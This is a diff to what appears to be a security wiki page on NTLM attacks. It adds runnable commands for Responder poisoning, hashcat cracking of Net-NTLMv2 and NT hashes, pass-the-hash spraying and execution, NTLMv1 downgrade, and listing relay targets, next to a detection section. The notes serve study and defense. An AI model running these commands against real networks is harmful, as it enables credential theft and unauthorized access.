@@ -62,6 +62,29 @@ the *plaintext* password for NTLM logons — the "just dump it" version of PtH.
   [[as-rep-roasting]], [[golden-silver-tickets]] — see
   [[kerberos-encryption-types]].
 
+## Commands (capture, crack, pass, downgrade)
+
+```bash
+# --- Capture Net-NTLMv2 (poison/coerce), then crack ---
+responder -I eth0 -wv                         # LLMNR/NBNS/mDNS -> Net-NTLMv2 ([[responder]], [[llmnr-nbt-ns-poisoning]])
+hashcat -m 5600 netntlmv2.txt wordlist.txt    # crack Net-NTLMv2 (the captured challenge/response)
+hashcat -m 1000 nt.txt wordlist.txt           # crack a raw NT hash (from lsass/SAM/NTDS)
+
+# --- Pass-the-Hash (no cracking) ---
+nxc smb 10.0.0.0/24 -u administrator -H <nthash>            # spray a hash for local admin (Pwn3d!)
+psexec.py -hashes :<nthash> corp.local/administrator@host  # exec via PtH ([[pass-the-hash-and-ticket]])
+
+# --- NTLMv1 downgrade (if v1 is still accepted) -> recover the NT hash ---
+responder -I eth0 --lm                         # force an LM/NTLMv1 downgrade
+#   then crack the NTLMv1 response (hashcat -m 5500), or use crack.sh for a guaranteed DES break -> NT hash
+
+# --- Where is NTLM/relay even possible? ---
+nxc smb 10.0.0.0/24 --gen-relay-list unsigned.txt   # hosts NOT requiring SMB signing = relay targets
+```
+
+Capture → relay (instead of crack) is [[ntlm-relay-coercion]]; the coercion that
+feeds it is [[printer-bug]] / [[mitm6-ipv6-relay]].
+
 ## Detection
 
 - **Event 4624 with LogonType 3 (network) + Authentication Package `NTLM`** —
